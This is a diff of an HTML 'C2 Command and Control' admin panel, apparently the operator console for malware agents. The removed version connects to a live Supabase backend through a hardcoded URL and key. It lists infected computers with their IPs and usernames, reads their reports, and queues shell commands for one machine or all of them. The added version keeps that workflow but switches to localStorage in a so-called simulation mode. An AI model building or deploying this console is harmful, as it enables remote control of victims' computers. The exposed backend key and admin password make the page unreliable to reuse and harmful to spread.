@@ -2,7 +2,6 @@
 <html>
 <head>
     <title>C2 Admin Panel</title>
-    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0a0a; color: #fff; font-family: monospace; padding: 20px; }
@@ -31,17 +30,17 @@
 <body>
 <div class="container">
     <div id="loginSection" class="login-box">
-        <h2>🔐 C2 ADMIN LOGIN</h2>
-        <input type="password" id="passwordInput" placeholder="Hasło administratora">
-        <button onclick="loginFunc()">Zaloguj</button>
+        <h2>C2 ADMIN LOGIN</h2>
+        <input type="password" id="passwordInput" placeholder="Admin password">
+        <button onclick="loginFunc()">Login</button>
     </div>
     
     <div id="mainSection" style="display:none;">
-        <h1>🎮 C2 COMMAND & CONTROL</h1>
+        <h1>C2 COMMAND AND CONTROL</h1>
         <div class="tabs">
-            <div class="tab active" onclick="showTab('computers')">💻 Komputery</div>
-            <div class="tab" onclick="showTab('reports')">📋 Raporty</div>
-            <div class="tab" onclick="showTab('commands')">⚡ Komendy</div>
+            <div class="tab active" onclick="showTab('computers')">COMPUTERS</div>
+            <div class="tab" onclick="showTab('reports')">REPORTS</div>
+            <div class="tab" onclick="showTab('commands')">COMMANDS</div>
         </div>
         
         <div id="computersTab">
@@ -53,8 +52,8 @@
         </div>
         
         <div id="commandsTab" style="display:none;">
-            <textarea id="commandInput" rows="3" placeholder="Wpisz komendę (np. dir C:\Users)"></textarea>
-            <button onclick="sendCommandToAll()" style="width:auto; margin-top:10px;">▶ Wykonaj na WSZYSTKICH</button>
+            <textarea id="commandInput" rows="3" placeholder="Enter command (e.g. dir C:\Users)"></textarea>
+            <button onclick="sendCommandToAll()" style="width:auto; margin-top:10px;">Run on ALL</button>
             <div id="commandResults"></div>
         </div>
     </div>
@@ -68,38 +67,136 @@
 </div>
 
 <script>
-    // 🔴🔴🔴 DANE SUPABASE I HASŁO 🔴🔴🔴
-    const SB_URL = "https://suipfydwvakzyxodycqm.supabase.co";
-    const SB_KEY = "sb_publishable_tzVu8Ml-hUbxjLxdEkJPJg_CX3f609n";
+    // ==========================================
+    // CONFIGURATION
+    // ==========================================
     const ADMIN_PASSWORD = "08319752026";
     
-    let supabase = null;
     let currentComputerId = null;
+    let computers = [];
     
-    // Funkcje globalne
-    window.loginFunc = loginFunc;
-    window.showTab = showTab;
-    window.closeModal = closeModal;
-    window.sendSingleCommand = sendSingleCommand;
-    window.sendCommandToAll = sendCommandToAll;
-    
-    async function loginFunc() {
+    // ==========================================
+    // LOGIN FUNCTION
+    // ==========================================
+    window.loginFunc = function() {
         const pwd = document.getElementById('passwordInput').value;
         if (pwd === ADMIN_PASSWORD) {
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('mainSection').style.display = 'block';
-            
-            // Inicjalizacja Supabase
-            supabase = window.supabase.createClient(SB_URL, SB_KEY);
-            
             loadComputers();
             setInterval(loadComputers, 30000);
         } else {
-            alert('Błędne hasło!');
+            alert('Wrong password!');
         }
+    };
+    
+    // ==========================================
+    // COMPUTER MANAGEMENT (SIMULATION)
+    // ==========================================
+    function loadComputers() {
+        const stored = localStorage.getItem('computers');
+        if (stored) {
+            computers = JSON.parse(stored);
+        } else {
+            computers = [
+                { id: 1, name: 'DESKTOP-ABC123', ip: '192.168.1.10', username: 'User1', last_seen: new Date().toISOString() },
+                { id: 2, name: 'LAPTOP-XYZ789', ip: '192.168.1.20', username: 'Admin', last_seen: new Date(Date.now() - 180000).toISOString() }
+            ];
+            localStorage.setItem('computers', JSON.stringify(computers));
+        }
+        
+        const container = document.getElementById('computersList');
+        container.innerHTML = '';
+        
+        computers.forEach(comp => {
+            const lastSeen = new Date(comp.last_seen);
+            const isOnline = (Date.now() - lastSeen) < 120000;
+            const status = isOnline ? 'online' : 'offline';
+            
+            const card = document.createElement('div');
+            card.className = `computer-card ${status}`;
+            card.onclick = () => showComputerDetails(comp);
+            card.innerHTML = `
+                <div class="computer-name">PC: ${comp.name}</div>
+                <div class="computer-ip">IP: ${comp.ip || 'N/A'}</div>
+                <div class="computer-ip">USER: ${comp.username || 'N/A'}</div>
+                <div class="computer-time">LAST: ${lastSeen.toLocaleString()}</div>
+            `;
+            container.appendChild(card);
+        });
     }
     
-    function showTab(tab) {
+    function showComputerDetails(computer) {
+        currentComputerId = computer.id;
+        
+        const modal = document.getElementById('computerModal');
+        const content = document.getElementById('modalContent');
+        
+        content.innerHTML = `
+            <h2>${computer.name}</h2>
+            <p>IP: ${computer.ip} | User: ${computer.username}</p>
+            <div style="margin-top:20px">
+                <h3>Execute command</h3>
+                <textarea id="singleCommand" rows="3" style="width:100%"></textarea>
+                <button onclick="sendSingleCommand()">Run</button>
+                <div id="cmdResult"></div>
+            </div>
+        `;
+        
+        modal.style.display = 'block';
+    }
+    
+    function sendSingleCommand() {
+        const cmd = document.getElementById('singleCommand').value;
+        const resultDiv = document.getElementById('cmdResult');
+        if (!cmd) return;
+        
+        resultDiv.innerHTML = 'Sending command...';
+        
+        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
+        commands.push({
+            id: Date.now(),
+            computer_id: currentComputerId,
+            command: cmd,
+            status: 'pending',
+            created_at: new Date().toISOString()
+        });
+        localStorage.setItem('commands', JSON.stringify(commands));
+        
+        resultDiv.innerHTML = 'Command sent. Agent will execute it.';
+    }
+    
+    function sendCommandToAll() {
+        const cmd = document.getElementById('commandInput').value;
+        if (!cmd) return;
+        
+        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
+        computers.forEach(comp => {
+            commands.push({
+                id: Date.now() + Math.random(),
+                computer_id: comp.id,
+                command: cmd,
+                status: 'pending',
+                created_at: new Date().toISOString()
+            });
+        });
+        localStorage.setItem('commands', JSON.stringify(commands));
+        
+        alert(`Command sent to ${computers.length} computers`);
+        loadCommandResults();
+    }
+    
+    function loadCommandResults() {
+        const commands = JSON.parse(localStorage.getItem('commands') || '[]');
+        document.getElementById('commandResults').innerHTML = `<pre>${JSON.stringify(commands, null, 2)}</pre>`;
+    }
+    
+    function loadAllReports() {
+        const reports = JSON.parse(localStorage.getItem('reports') || '[]');
+        document.getElementById('reportsContent').innerHTML = JSON.stringify(reports, null, 2);
+    }
+    
+    window.showTab = function(tab) {
         document.getElementById('computersTab').style.display = tab === 'computers' ? 'block' : 'none';
         document.getElementById('reportsTab').style.display = tab === 'reports' ? 'block' : 'none';
         document.getElementById('commandsTab').style.display = tab === 'commands' ? 'block' : 'none';
@@ -113,141 +210,16 @@
         
         if (tab === 'reports') loadAllReports();
         if (tab === 'commands') loadCommandResults();
-    }
+    };
     
-    function closeModal() {
+    window.closeModal = function() {
         document.getElementById('computerModal').style.display = 'none';
-    }
+    };
     
-    async function loadComputers() {
-        if (!supabase) return;
-        const { data, error } = await supabase.from('computers').select('*').order('last_seen', {ascending: false});
-        if (error) {
-            console.error('Błąd ładowania komputerów:', error);
-            return;
-        }
-        
-        const container = document.getElementById('computersList');
-        container.innerHTML = '';
-        
-        if (!data || data.length === 0) {
-            container.innerHTML = '<div style="text-align:center; padding:50px;">Brak komputerów. Agent jeszcze nie wystartował.</div>';
-            return;
-        }
-        
-        data.forEach(comp => {
-            const lastSeen = new Date(comp.last_seen);
-            const isOnline = (Date.now() - lastSeen) < 120000;
-            const status = isOnline ? 'online' : 'offline';
-            
-            const card = document.createElement('div');
-            card.className = `computer-card ${status}`;
-            card.onclick = () => showComputerDetails(comp);
-            card.innerHTML = `
-                <div class="computer-name">🖥️ ${comp.name}</div>
-                <div class="computer-ip">📡 ${comp.ip || 'N/A'}</div>
-                <div class="computer-ip">👤 ${comp.username || 'N/A'}</div>
-                <div class="computer-time">⏱️ ${lastSeen.toLocaleString()}</div>
-            `;
-            container.appendChild(card);
-        });
-    }
+    window.sendSingleCommand = sendSingleCommand;
+    window.sendCommandToAll = sendCommandToAll;
     
-    async function showComputerDetails(computer) {
-        currentComputerId = computer.id;
-        
-        const modal = document.getElementById('computerModal');
-        const content = document.getElementById('modalContent');
-        
-        content.innerHTML = `
-            <h2>${computer.name}</h2>
-            <p>IP: ${computer.ip} | User: ${computer.username} | Last: ${new Date(computer.last_seen).toLocaleString()}</p>
-            <div style="margin-top:20px">
-                <h3>📋 Ostatnie raporty</h3>
-                <div id="computerReports"></div>
-                <h3>💻 Wykonaj komendę</h3>
-                <textarea id="singleCommand" rows="3" style="width:100%"></textarea>
-                <button onclick="sendSingleCommand()">▶ Wykonaj</button>
-                <div id="cmdResult"></div>
-            </div>
-        `;
-        
-        if (supabase) {
-            const { data: reports } = await supabase.from('reports').select('*').eq('computer_id', computer.id).order('created_at', {ascending: false}).limit(5);
-            const reportsDiv = document.getElementById('computerReports');
-            if (reports && reports.length) {
-                reportsDiv.innerHTML = `<pre>${JSON.stringify(reports, null, 2)}</pre>`;
-            } else {
-                reportsDiv.innerHTML = '<p>Brak raportów</p>';
-            }
-        }
-        
-        modal.style.display = 'block';
-    }
-    
-    async function sendSingleCommand() {
-        const cmd = document.getElementById('singleCommand').value;
-        const resultDiv = document.getElementById('cmdResult');
-        if (!cmd || !supabase) return;
-        
-        resultDiv.innerHTML = '⏳ Wysyłanie...';
-        
-        const { error } = await supabase.from('commands').insert({
-            computer_id: currentComputerId,
-            command: cmd,
-            status: 'pending'
-        });
-        
-        if (error) {
-            resultDiv.innerHTML = '❌ Błąd: ' + error.message;
-        } else {
-            resultDiv.innerHTML = '✅ Komenda wysłana. Wynik pojawi się gdy agent ją wykona.';
-        }
-    }
-    
-    async function sendCommandToAll() {
-        const cmd = document.getElementById('commandInput').value;
-        if (!cmd || !supabase) return;
-        
-        const { data: computers } = await supabase.from('computers').select('id');
-        if (!computers || computers.length === 0) {
-            alert('Brak komputerów');
-            return;
-        }
-        
-        for (const comp of computers) {
-            await supabase.from('commands').insert({
-                computer_id: comp.id,
-                command: cmd,
-                status: 'pending'
-            });
-        }
-        alert(`Komenda wysłana do ${computers.length} komputerów`);
-    }
-    
-    async function loadAllReports() {
-        if (!supabase) return;
-        const { data } = await supabase.from('reports').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
-        document.getElementById('reportsContent').innerHTML = data ? JSON.stringify(data, null, 2) : 'Brak raportów';
-    }
-    
-    async function loadCommandResults() {
-        if (!supabase) return;
-        const { data } = await supabase.from('commands').select('*, computers(name)').order('created_at', {ascending: false}).limit(50);
-        document.getElementById('commandResults').innerHTML = data ? `<pre>${JSON.stringify(data, null, 2)}</pre>` : 'Brak komend';
-    }
-    
-    // Test połączenia z Supabase przy starcie
-    async function testConnection() {
-        try {
-            const testUrl = `${SB_URL}/rest/v1/?apikey=${SB_KEY}`;
-            const response = await fetch(testUrl);
-            console.log('Test połączenia Supabase:', response.status);
-        } catch(e) {
-            console.error('Brak połączenia z Supabase:', e);
-        }
-    }
-    testConnection();
+    console.log('C2 Panel started (simulation mode)');
 </script>
 </body>
 </html>
